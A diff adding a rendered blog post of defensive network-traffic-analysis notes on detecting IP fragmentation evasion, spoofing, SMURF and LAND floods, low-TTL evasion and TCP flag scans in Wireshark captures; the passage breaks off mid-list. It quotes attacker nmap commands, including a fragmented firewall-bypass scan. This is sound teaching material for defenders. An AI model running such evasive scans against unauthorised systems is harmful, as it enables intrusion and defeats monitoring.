@@ -1,0 +1,2014 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Mostafa Ashour ">
+<meta name="description" content="Fragmentation Attacks Related PCAP File(s)—nmap_frag_fw_bypass.pcapng.
+When investigating network anomalies, start by examining the IP layer
+The IP layer is:
+Responsible for transferring data packets between network points (from one hop to another). Using source and destination IP addresses to facilitate communication between hosts (inter-hosts communication). IP addresses can be found within the IP header of each packet when analyzing network traffic.
+Keep in mind that the IP layer itself doesn&rsquo;t detect lost, dropped, or altered/tampered packets.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/posts/2026/04/detecting-network-abnormalities/" />
+
+
+    <title>
+        
+            Detecting Network Abnormalities :: Ashour Blog  — Hello Friend NG Theme
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="http://localhost:1313/main.min.7289daf2e88ea2c7b253a51cc5794c7cc17e7aeb7295a19d978db764a5862f25.css" integrity="sha256-cona8uiOoseyU6UcxXlMfMF&#43;eutylaGdl423ZKWGLyU=" crossorigin="anonymous">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+    <link rel="manifest" href="http://localhost:1313/site.webmanifest">
+    <link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="http://localhost:1313/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Detecting Network Abnormalities">
+  <meta itemprop="description" content="Fragmentation Attacks Related PCAP File(s)—nmap_frag_fw_bypass.pcapng.
+When investigating network anomalies, start by examining the IP layer
+The IP layer is:
+Responsible for transferring data packets between network points (from one hop to another). Using source and destination IP addresses to facilitate communication between hosts (inter-hosts communication). IP addresses can be found within the IP header of each packet when analyzing network traffic.
+Keep in mind that the IP layer itself doesn’t detect lost, dropped, or altered/tampered packets.">
+  <meta itemprop="datePublished" content="2026-04-24T01:51:12+03:00">
+  <meta itemprop="dateModified" content="2026-04-24T01:51:12+03:00">
+  <meta itemprop="wordCount" content="7749">
+  <meta itemprop="image" content="http://localhost:1313/">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/">
+  <meta name="twitter:title" content="Detecting Network Abnormalities">
+  <meta name="twitter:description" content="Fragmentation Attacks Related PCAP File(s)—nmap_frag_fw_bypass.pcapng.
+When investigating network anomalies, start by examining the IP layer
+The IP layer is:
+Responsible for transferring data packets between network points (from one hop to another). Using source and destination IP addresses to facilitate communication between hosts (inter-hosts communication). IP addresses can be found within the IP header of each packet when analyzing network traffic.
+Keep in mind that the IP layer itself doesn’t detect lost, dropped, or altered/tampered packets.">
+
+
+
+    <meta property="og:url" content="http://localhost:1313/posts/2026/04/detecting-network-abnormalities/">
+  <meta property="og:site_name" content="Ashour Blog">
+  <meta property="og:title" content="Detecting Network Abnormalities">
+  <meta property="og:description" content="Fragmentation Attacks Related PCAP File(s)—nmap_frag_fw_bypass.pcapng.
+When investigating network anomalies, start by examining the IP layer
+The IP layer is:
+Responsible for transferring data packets between network points (from one hop to another). Using source and destination IP addresses to facilitate communication between hosts (inter-hosts communication). IP addresses can be found within the IP header of each packet when analyzing network traffic.
+Keep in mind that the IP layer itself doesn’t detect lost, dropped, or altered/tampered packets.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-04-24T01:51:12+03:00">
+    <meta property="article:modified_time" content="2026-04-24T01:51:12+03:00">
+    <meta property="og:image" content="http://localhost:1313/">
+
+
+
+
+
+
+    <meta property="article:published_time" content="2026-04-24 01:51:12 &#43;0300 EEST" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="http://localhost:1313/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                mostafa@ashour:~$</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner">
+                <li><a href="http://localhost:1313/about/">About</a></li>
+            
+                <li><a href="http://localhost:1313/posts/">Posts</a></li>
+            
+        <ul class="submenu">
+            <li class="dropdown">
+                <a href="javascript:void(0)" class="dropbtn">en</a>
+                <div class="dropdown-content">
+                        
+                </div>
+            </li>
+        </ul>
+    </ul>
+</nav>
+
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+        </span>
+    </span>
+</header>
+
+
+            
+  <div class="content">
+    <main class="post">
+
+      <div class="post-info">
+        <p>
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+              <circle cx="12" cy="12" r="10"></circle>
+              <polyline points="12 6 12 12 16 14"></polyline>
+            </svg>
+            37 minutes
+          
+
+          
+        </p>
+      </div>
+
+      <article>
+        <h1 class="post-title">
+          <a href="http://localhost:1313/posts/2026/04/detecting-network-abnormalities/">Detecting Network Abnormalities</a>
+        </h1>
+
+        
+
+        
+
+        
+
+        <div class="post-content">
+          <h1 id="fragmentation-attacks">Fragmentation Attacks</h1>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>nmap_frag_fw_bypass.pcapng</code>.</p>
+</li>
+<li>
+<p>When investigating network anomalies, start by examining the IP layer</p>
+</li>
+<li>
+<p>The IP layer is:</p>
+<ul>
+<li>Responsible for transferring data packets between network points (from one hop to another).</li>
+<li>Using source and destination IP addresses to facilitate communication between hosts (inter-hosts communication).</li>
+</ul>
+</li>
+<li>
+<p>IP addresses can be found within the IP header of each packet when analyzing network traffic.</p>
+</li>
+<li>
+<p>Keep in mind that the IP layer itself doesn&rsquo;t detect lost, dropped, or altered/tampered packets.</p>
+</li>
+<li>
+<p>Instead, the transport or application layers handle these issues.</p>
+</li>
+<li>
+<p>To dissect these packets, we can explore some of their fields:</p>
+<ol>
+<li><code>Length - IP header length</code>—This field contains the overall length of the IP header.</li>
+<li><code>Total Length - IP Datagram/Packet Length</code>—This field specifies the entire length of the IP packet, including any relevant data.</li>
+<li><code>Fragment Offset</code>—In many cases when a packet is large enough to be divided, the fragmentation offset will be set to provide instructions to reassemble the packet upon delivery to the destination host.</li>
+<li><code>Source and Destination IP Addresses</code>—These fields contain the origination (source) and destination IP addresses for the two communicating hosts.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/IPheader.jpg" alt="IPheader"></li>
+</ol>
+</li>
+</ul>
+<h2 id="commonly-abused-fields">Commonly Abused Fields</h2>
+<ul>
+<li>Attackers may craft packets to disrupt communication or evade intrusion detection systems (IDS) by malforming or modifying packets.</li>
+<li>Understanding these fields and detecting their misuse is crucial for effective traffic analysis.</li>
+</ul>
+<h2 id="abuse-of-fragmentation">Abuse of Fragmentation</h2>
+<ul>
+<li>
+<p>Fragmentation serves as a means for our legitimate hosts to communicate large data sets to one another by splitting the packets and reassembling them upon delivery.</p>
+</li>
+<li>
+<p>This is commonly achieved through setting a <em><strong>Maximum Transmission Unit (MTU)</strong></em>.</p>
+</li>
+<li>
+<p>The Maximum Transmission Unit (MTU) determines the standard size used to break down large data packets into smaller, equal-sized packets for transmission, except for the final packet that might be smaller than the others.</p>
+</li>
+<li>
+<p>This process ensures that the receiving computer knows how to reassemble these packets in logical order.</p>
+</li>
+<li>
+<p>Commonly, attackers might abuse this field for the following purposes:</p>
+</li>
+</ul>
+<ol>
+<li><code>IPS/IDS Evasion</code>—If intrusion detection controls don&rsquo;t reassemble fragmented packets, an attacker could bypass them by fragmenting enumeration techniques like Nmap, which would then be reassembled at the destination host.</li>
+<li><code>Firewall Evasion</code>—Fragmentation can allow attackers to bypass firewall controls. If a firewall doesn&rsquo;t reassemble fragmented packets, enumeration attempts may succeed.</li>
+<li><code>Firewall/IPS/IDS Resource Exhaustion</code>—An attacker could fragment packets to a very small MTU (e.g., 10, 15, or 20), the network control might not reassemble these packets due to resource constraints, and the attacker might succeed in their enumeration efforts.</li>
+<li><code>Denial of Service</code>—Attackers can exploit fragmentation in older hosts to send oversized IP packets (&gt;65535 bytes) via ping, causing reassembly issues and denial-of-service.</li>
+</ol>
+<ul>
+<li>If our network mechanism were to perform correctly. It should do the following:</li>
+</ul>
+<ol>
+<li><code>Delayed Reassembly</code>—The IDS/IPS/Firewall should act the same as the destination host, in the sense that it waits for all fragments to arrive to reconstruct the transmission to perform packet inspection.</li>
+</ol>
+<h2 id="finding-irregularities-in-fragment-offsets">Finding Irregularities in Fragment Offsets</h2>
+<ul>
+<li>In order to better understand the abovementioned mechanics, we can open the related traffic capture file in Wireshark.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>wireshark nmap_frag_fw_bypass.pcapng
+</span></span></code></pre></div><p><img src="http://localhost:1313/Network%20Traffic%20Analysis/detecting_network_abnormalities_1.png" alt="detecting_network_abnormalities_1"></p>
+<ul>
+<li>For starters, we might notice several ICMP requests going to one host from another, this is indicative of the starting requests from a traditional Nmap scan.</li>
+<li>This is the beginning of the host discovery process.</li>
+<li>An attacker might run a command like this. (Attacker&rsquo;s Enumeration)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap &lt;host ip&gt;
+</span></span></code></pre></div><ul>
+<li>
+<p>In doing so, they will generate the following.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/detecting_network_abnormalities_1.png" alt="detecting_network_abnormalities_1"></p>
+</li>
+<li>
+<p>Secondarily, an attacker might define a maximum transmission unit size like this in order to fragment their port scanning packets.</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap -f <span style="color:#ae81ff">10</span> &lt;host ip&gt;
+</span></span></code></pre></div><ul>
+<li>
+<p>In doing so they will generate IP packets with a maximum size of 10.</p>
+</li>
+<li>
+<p>Seeing a ton of fragmentation from a host can be an indicator of this attack, and it would look like the following.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/2-frag.png" alt="2-frag"></p>
+</li>
+<li>
+<p>A more obvious sign of a fragmentation scan, regardless of it&rsquo;s evasion use, is that it connects one computer/host to many different ports.</p>
+</li>
+<li>
+<p>Let&rsquo;s take the following for instance.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/3-frag.png" alt="3-frag"></p>
+</li>
+<li>
+<p>In this case, the destination host would respond with RST flags for ports which do not have an active service running on them (aka closed ports).</p>
+</li>
+<li>
+<p>This pattern is a clear indication of a fragmented scan.</p>
+</li>
+<li>
+<p>If our Wireshark is not reassembling packets for our inspection, we can make a quick change in our preferences for the IPv4 protocol.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/4-frag.png" alt="4-frag"></p>
+</li>
+</ul>
+<hr>
+<h1 id="ip-source--destination-spoofing-attacks">IP Source &amp; Destination Spoofing Attacks</h1>
+<ul>
+<li>
+<p>There are many cases where we might see irregular traffic for IPv4 and IPv6 packets, where in much cases might be done through the source and destination IP fields.</p>
+</li>
+<li>
+<p>Consider the following when analyzing these fields:</p>
+<ol>
+<li><em><strong>Incoming Traffic</strong></em> to your network should obviously have a Source IP Address that doesn’t belong to your network address space (subnet space). If it does, it is most probably crafted.</li>
+<li><em><strong>Outgoing Traffic</strong></em> from your network should obviously have a Source IP Address that belongs to your network address space. If it doesn’t, there is most probably a misconfiguration or the address is spoofed.</li>
+</ol>
+</li>
+<li>
+<p>An attacker might conduct these packet crafting attacks towards the source and destination IP addresses for many different reasons or desired outcomes, for instance:</p>
+</li>
+</ul>
+<ol>
+<li><code>Decoy Scanning</code>:
+<ul>
+<li>In an attempt to bypass firewall restrictions, an attacker might change the source IP of packets to enumerate further information about a host in another network segment.</li>
+<li>Through changing the source to something within the same subnet as the target host, the attacker might succeed in firewall evasion.</li>
+</ul>
+</li>
+<li><code>Random Source Attack DDoS</code>:
+<ul>
+<li>Through random source crafting an attacker might be able to send tons of traffic to the same port on the victim host.</li>
+<li>This in many cases, is used to exhaust resources of our network controls or on the destination host.</li>
+</ul>
+</li>
+<li><code>LAND Attacks</code>:
+<ul>
+<li><em><strong>LAND</strong></em> Attacks operate similarly to Random Source denial-of-service attacks in the nature that the source address is set to the same as the destination hosts.</li>
+<li>In doing so the attacker might be able to exhaust network resources or cause crashes on the target host.</li>
+</ul>
+</li>
+<li><code>SMURF Attacks</code>:
+<ul>
+<li>Similar to LAND and Random Source attacks, SMURF attacks work through the attacker sending large amounts of ICMP packets to many different hosts.</li>
+<li>However, in this case the source address is set to the victim machines, and all of the hosts which receive this ICMP packet respond with an ICMP reply causing resource exhaustion on the crafted source address (victim).</li>
+</ul>
+</li>
+<li><code>Initialization Vector Generation</code>:
+<ul>
+<li>In older wireless networks like those using Wired Equivalent Privacy (WEP), an attacker could do the following to break the encryption:
+<ul>
+<li>First, they would capture a network packet.</li>
+<li>Then, they would decrypt it.</li>
+<li>Next, they would change the packet&rsquo;s source and destination IP addresses and re-inject it back into the network.</li>
+</ul>
+</li>
+<li>This allows the attacker to create new initialization vectors, which are used to build a decryption table.</li>
+<li>This table is then used in a statistical attack to crack the WEP encryption.</li>
+<li>You can detect this type of attack by observing a large number of identical packets being sent between computers on the network.</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>It&rsquo;s important to understand that the previous attacks come from IP layer communication, not necessarily ARP poisoning.</li>
+<li>However, these attacks are often used together with ARP poisoning in malicious activities.</li>
+</ul>
+<h2 id="finding-decoy-scanning-attempts">Finding Decoy Scanning Attempts</h2>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>decoy_scanning_nmap.pcapng</code></p>
+</li>
+<li>
+<p>To gather information, an attacker might disguise/change their source address to:</p>
+<ul>
+<li>Match a legitimate host.</li>
+<li>Use a completely fabricated address (in some cases entirely different from any real host).</li>
+</ul>
+</li>
+<li>
+<p>This is to attempt to evade IDS/Firewall controls, and it can be easily observed.</p>
+</li>
+<li>
+<p>In the case of decoy scanning, we will notice some strange behavior.</p>
+<ol>
+<li><code>Initial Fragmentation from a fake address</code></li>
+<li><code>Some TCP traffic from the legitimate source address</code>
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/1-decoy.png" alt="1-decoy"></li>
+</ol>
+</li>
+<li>
+<p>In this type of attack, the attacker might try to hide their actual address using a fake one.</p>
+</li>
+<li>
+<p>However, the replies from the targeted system, indicating that the ports are closed (using TCP RST flags), will still be sent to the attacker.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/2-decoy.png" alt="2-decoy"></p>
+</li>
+<li>
+<p>We will definitely notice this in the case of a large port block which has no services running on the victim host.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/3-decoy.png" alt="3-decoy"></p>
+</li>
+<li>
+<p>As such, another simple way that we can prevent this attack beyond just detecting it through our traffic analysis efforts is the following.</p>
+</li>
+</ul>
+<ol>
+<li><code>Have our IDS/IPS/Firewall act as the destination host would</code>—In the sense that reconstructing the packets gives a clear indication of malicious activity.</li>
+<li><code>Watch for connections started by one host, and taken over by another</code>—The attacker after all has to reveal their true source address in order to see that a port is open. This is strange behavior and we can define our rules to prevent it.</li>
+</ol>
+<h2 id="finding-random-source-attacks">Finding Random Source Attacks</h2>
+<ul>
+<li>
+<p>Related PCAP File(s):</p>
+<ul>
+<li><code>ICMP_rand_source.pcapng</code></li>
+<li><code>ICMP_rand_source_larg_data.pcapng</code></li>
+<li><code>TCP_rand_source_attacks.pcapng</code></li>
+</ul>
+</li>
+<li>
+<p>Denial-of-service attacks can also use spoofing of source and destination addresses.</p>
+</li>
+<li>
+<p>A common example is a random source attack.</p>
+</li>
+<li>
+<p>This attack has many variations, but one notable type is similar to the opposite of a SMURF attack. In this case, many hosts send a ping request to a host that doesn&rsquo;t exist.</p>
+</li>
+<li>
+<p>The nonexistent host then attempts to reply to all the original hosts, but receives no response.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/1-random-source.png" alt="1-random-source"></p>
+</li>
+<li>
+<p>We should also consider that attackers might fragment these random hosts communications in order to draw out more resource exhaustion.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/2-random-source.png" alt="2-random-source"></p>
+</li>
+<li>
+<p>In many cases, such as LAND attacks, attackers exhaust resources by targeting a specific service on a port.</p>
+</li>
+<li>
+<p>Instead of spoofing the source address to match the destination, they may randomize it, resulting in the following.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/3-random-source.png" alt="3-random-source"></p>
+</li>
+<li>
+<p>In this case, we have a few indicators of nefarious behavior:</p>
+<ol>
+<li><code>Single Port Utilization from random hosts</code></li>
+<li><code>Incremental Base Port with a lack of randomization</code></li>
+<li><code>Identical Length Fields</code></li>
+</ol>
+</li>
+<li>
+<p>In many real world cases, like a web server, we may have many different users utilizing the same port.</p>
+</li>
+<li>
+<p>However, these requests are contrary of our indicators.</p>
+</li>
+<li>
+<p>Such that:</p>
+<ul>
+<li>They will have different lengths.</li>
+<li>The base ports will not exhibit this behavior.</li>
+</ul>
+</li>
+</ul>
+<h2 id="finding-smurf-attacks">Finding Smurf Attacks</h2>
+<ul>
+<li>
+<p>SMURF attacks are a type of distributed denial-of-service attack.</p>
+</li>
+<li>
+<p>They work by tricking multiple computers into sending responses to a victim&rsquo;s computer, overwhelming it with traffic.</p>
+</li>
+<li>
+<p>Here&rsquo;s how an attacker carries out this type of attack:</p>
+<ol>
+<li><code>The attacker will send an ICMP request to live hosts with a spoofed address of the victim host</code></li>
+<li><code>The live hosts will respond to the legitimate victim host with an ICMP reply</code></li>
+<li><code>This may cause resource exhaustion on the victim host</code></li>
+</ol>
+</li>
+<li>
+<p>One of the things we can look for in our traffic behavior is an excessive amount of ICMP replies from a single host to our affected host.</p>
+</li>
+<li>
+<p>Sometimes attackers will include fragmentation and data on these ICMP requests to make the traffic volume larger.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/1-SMURF.png" alt="1-SMURF"></p>
+</li>
+<li>
+<p>We might notice many different hosts pinging our single host, and in this case it represents the basic nature of SMURF attacks.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/smurf.webp" alt="smurf"></p>
+</li>
+<li>
+<p>Smurf Attack Explanation—<a href="https://techofide.com/blogs/what-is-smurf-attack-what-is-the-denial-of-service-attack-practical-ddos-attack-step-by-step-guide/">What is Smurf Attack? | What is The Denial Of Service Attack?</a>.</p>
+</li>
+</ul>
+<h2 id="finding-land-attacks">Finding LAND Attacks</h2>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>LAND-DoS.pcapng</code>.</p>
+</li>
+<li>
+<p>A LAND attack is a type of denial-of-service attack where the attacker changes the sender/source&rsquo;s address to be the same as the receiver/destination&rsquo;s address.</p>
+</li>
+<li>
+<p>This attack overwhelms the target with a large amount of traffic and by using up all available ports.</p>
+</li>
+<li>
+<p>If all ports are busy, it becomes very difficult for legitimate connections to be made to the targeted computer.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/1-LAND.png" alt="1-LAND"></p>
+</li>
+</ul>
+<hr>
+<h1 id="ip-time-to-live-attacks">IP Time-to-Live Attacks</h1>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>ip_ttl.pcapng</code>.</p>
+</li>
+<li>
+<p>Attackers use Time-to-Live (TTL) attacks for evasion.</p>
+</li>
+<li>
+<p>They intentionally set low TTL values on IP packets to bypass firewalls, Intrusion Detection Systems (IDS), and Intrusion Prevention Systems (IPS).
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/ttl-attack-diagram.png" alt="ttl-attack-diagram"></p>
+</li>
+</ul>
+<ol>
+<li>The attacker will craft an IP packet with an intentionally low TTL value (1, 2, 3 and so on).</li>
+<li>Through each host that this packet passes through this TTL value will be decremented by one until it reaches zero.</li>
+<li>Upon reaching zero this packet will be discarded. The attacker will try to get this packet discarded before it reaches a firewall or filtering system to avoid detection/controls.</li>
+<li>When the packets expire, the routers along the path generate ICMP Time Exceeded messages and send them back to the source IP address.</li>
+</ol>
+<h4 id="finding-irregularities-in-ip-ttl">Finding Irregularities in IP TTL</h4>
+<ul>
+<li>
+<p>To begin:</p>
+<ul>
+<li>Capture network traffic.</li>
+<li>Analyze it in Wireshark.</li>
+</ul>
+</li>
+<li>
+<p>Detecting this in small amounts can be difficult, but fortunately for us attackers will most times utilize TTL manipulation in port scanning efforts.</p>
+</li>
+<li>
+<p>Right away we might notice something like the following.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/1-ttl.png" alt="1-ttl"></p>
+</li>
+<li>
+<p>Alternatively, a returned SYN, ACK message from a legitimate service port on the affected host could indicate the attacker bypassed a firewall control.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/2-ttl.png" alt="2-ttl"></p>
+</li>
+<li>
+<p>Opening a packet and inspecting the IPv4 tab in Wireshark would reveal a likely cause: a very low TTL.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/3-ttl.png" alt="3-ttl"></p>
+</li>
+<li>
+<p>We can mitigate IP packet crafting attacks by implementing a control that discards packets with insufficient TTL values.</p>
+</li>
+</ul>
+<hr>
+<h1 id="tcp-handshake-abnormalities">TCP Handshake Abnormalities</h1>
+<ul>
+<li>
+<p>When attackers are gathering/gaining information about our TCP services, we might notice a few odd behaviors during our traffic analysis efforts.</p>
+</li>
+<li>
+<p>Firstly, let&rsquo;s consider how normal TCP connections work with their 3-way handshake.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/tcp_handshake_1.jpg" alt="tcp_handshake_1"></p>
+</li>
+<li>
+<p>To start a TCP connection, the client sends a TCP SYN request to the machine it wants to connect to.</p>
+</li>
+<li>
+<p>This begins the TCP connection process.</p>
+</li>
+<li>
+<p>If this port is open, and in fact able to be connected to, the machine responds with a TCP SYN/ACK to acknowledge that the connection is valid and able to be used.</p>
+</li>
+<li>
+<p>However, we should consider all TCP flags.</p>
+</li>
+</ul>
+<table>
+  <thead>
+      <tr>
+          <th><strong>Flags</strong></th>
+          <th><strong>Description</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>URG (Urgent)</code></td>
+          <td>This flag is to denote urgency with the current data in stream.</td>
+      </tr>
+      <tr>
+          <td><code>ACK (Acknowledgement)</code></td>
+          <td>This flag acknowledges receipt of data.</td>
+      </tr>
+      <tr>
+          <td><code>PSH (Push)</code></td>
+          <td>This flag instructs the TCP stack to immediately deliver the received data to the application layer, and bypass buffering.</td>
+      </tr>
+      <tr>
+          <td><code>RST (Reset)</code></td>
+          <td>This flag is used for termination of the TCP connection.</td>
+      </tr>
+      <tr>
+          <td><code>SYN (Synchronize)</code></td>
+          <td>This flag is used to establish an initial connection with TCP.</td>
+      </tr>
+      <tr>
+          <td><code>FIN (Finish)</code></td>
+          <td>This flag is used to denote the finish of a TCP connection. It is used when no more data needs to be sent.</td>
+      </tr>
+      <tr>
+          <td><code>ECN (Explicit Congestion Notification)</code></td>
+          <td>This flag is used to denote congestion within our network, it is to let the hosts know to avoid unnecessary re-transmissions.</td>
+      </tr>
+  </tbody>
+</table>
+<ul>
+<li>As such, when we are performing our traffic analysis efforts we can look for the following strange conditions:</li>
+</ul>
+<ol>
+<li><code>Too many flags of a kind or kinds</code>—This could show us that scanning is occurring within our network.</li>
+<li><code>The usage of different and unusual flags</code>—Sometimes this could indicate a TCP RST attack, hijacking, or simply some form of control evasion for scanning.</li>
+<li><code>Solo host to multiple ports, or solo host to multiple hosts</code>—Easy enough, we can find scanning as we have done before by noticing where these connections are going from one host. In a lot of cases, we may even need to consider decoy scans and random source attacks.</li>
+</ol>
+<h2 id="excessive-syn-flags">Excessive SYN Flags</h2>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>nmap_syn_scan.pcapng</code>.</p>
+</li>
+<li>
+<p>One of the first suspicious network activities to look for is an excessive number of SYN flags.</p>
+</li>
+<li>
+<p>This often indicates an Nmap scan.</p>
+</li>
+<li>
+<p>An attacker sends TCP SYN packets to various ports on the target machine.</p>
+</li>
+<li>
+<p>If a port is open, the target responds with a SYN-ACK packet, as expected in a normal TCP handshake.</p>
+</li>
+<li>
+<p>However, the attacker&rsquo;s scanner then sends an RST packet, prematurely ending the connection.</p>
+</li>
+<li>
+<p>It&rsquo;s important to note that the target machine will also respond with RST packets to SYN packets sent to closed ports, which can make analysis more complex.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/1-TCPhandshake.png" alt="1-TCPhandshake"></p>
+</li>
+<li>
+<p>However it is worth noting that there are two primary scan types we might detect that use the SYN flag.</p>
+</li>
+<li>
+<p>These are:</p>
+</li>
+</ul>
+<ol>
+<li><code>SYN Scans</code> - In these scans the behavior will be as we see, however the attacker will pre-emptively end the handshake with the RST flag.</li>
+<li><code>SYN Stealth Scans</code> - In this case the attacker will attempt to evade detection by only partially completing the TCP handshake.</li>
+</ol>
+<h2 id="no-flags">No Flags</h2>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>nmap_null_scan.pcapng</code>.</p>
+</li>
+<li>
+<p>Conversely, an attacker might send a NULL scan, which involves transmitting TCP packets with no flags set.</p>
+</li>
+<li>
+<p>The following describes TCP connection behavior upon receiving a NULL packet.</p>
+</li>
+</ul>
+<ol>
+<li><code>If the port is open</code>—The system will not respond at all since there is no flags.</li>
+<li><code>If the port is closed</code>—The system will respond with an RST packet.</li>
+</ol>
+<ul>
+<li>As such a NULL scan might look like the following.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/2-TCPhandshake.png" alt="2-TCPhandshake"></li>
+</ul>
+<h2 id="too-many-acks">Too Many ACKs</h2>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>nmap_ack_scan.pcapng</code>.</p>
+</li>
+<li>
+<p>Alternatively, excessive acknowledgements between two hosts may indicate an attacker using an ACK scan.</p>
+</li>
+<li>
+<p>In the case of an ACK scan TCP connections will behave like the following.</p>
+</li>
+</ul>
+<ol>
+<li><code>If the port is open</code>—The affected machine will either not respond, or will respond with an RST packet.</li>
+<li><code>If the port is closed</code>—The affected machine will respond with an RST packet.</li>
+</ol>
+<ul>
+<li>So, we might see the following traffic which would indicate an ACK scan.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/3-TCPhandshake.png" alt="3-TCPhandshake"></li>
+</ul>
+<h2 id="excessive-fins">Excessive FINs</h2>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>nmap_fin_scan.pcapng</code>.</p>
+</li>
+<li>
+<p>Using another part of the handshake, an attacker might utilize a FIN scan. In this case, all TCP packets will be marked with the FIN flag.</p>
+</li>
+<li>
+<p>We might notice the following behavior from our affected machine.</p>
+</li>
+</ul>
+<ol>
+<li><code>If the port is open</code>—Our affected machine simply will not respond.</li>
+<li><code>If the port is closed</code>—Our affected machine will respond with an RST packet.</li>
+</ol>
+<p><img src="http://localhost:1313/Network%20Traffic%20Analysis/4-TCPhandshake.png" alt="4-TCPhandshake"></p>
+<h2 id="just-too-many-flags">Just too many flags</h2>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>nmap_xmas_scan.pcapng</code>.</p>
+</li>
+<li>
+<p>An attacker attempting a &ldquo;spaghetti at the wall&rdquo; approach might use an Xmas tree scan, setting all TCP flags in their transmissions.</p>
+</li>
+<li>
+<p>The affected host&rsquo;s response to this scan would then be as follows.</p>
+</li>
+</ul>
+<ol>
+<li><code>If the port is open</code>—The affected machine will not respond, or at least it will with an RST packet.</li>
+<li><code>If the port is closed</code>—The affected machine will respond with an RST packet.</li>
+</ol>
+<ul>
+<li>Xmas tree scans are pretty easy to spot and look like the following.
+<img src="http://localhost:1313/Network%20Traffic%20Analysis/5-TCPhandshake.png" alt="5-TCPhandshake"></li>
+</ul>
+<hr>
+<h1 id="tcp-connection-resets--hijacking">TCP Connection Resets &amp; Hijacking</h1>
+<ul>
+<li>TCP lacks sufficient protection against connection termination or hijacking by an attacker.</li>
+<li>Consequently, connections may be:
+<ul>
+<li>Terminated by RST packets.</li>
+<li>hijacked through connection Hijacking.</li>
+</ul>
+</li>
+</ul>
+<h2 id="tcp-connection-termination">TCP Connection Termination</h2>
+<ul>
+<li>
+<p>Related PCAP File(s)—<code>RST_Attack.pcapng</code>.</p>
+</li>
+<li>
+<p>Suppose an adversary wanted to cause denial-of-service conditions within our network.</p>
+</li>
+<li>
+<p>They might employ a simple TCP RST Packet injection attack, or TCP connection termination in simple terms.</p>
+</li>
+<li>
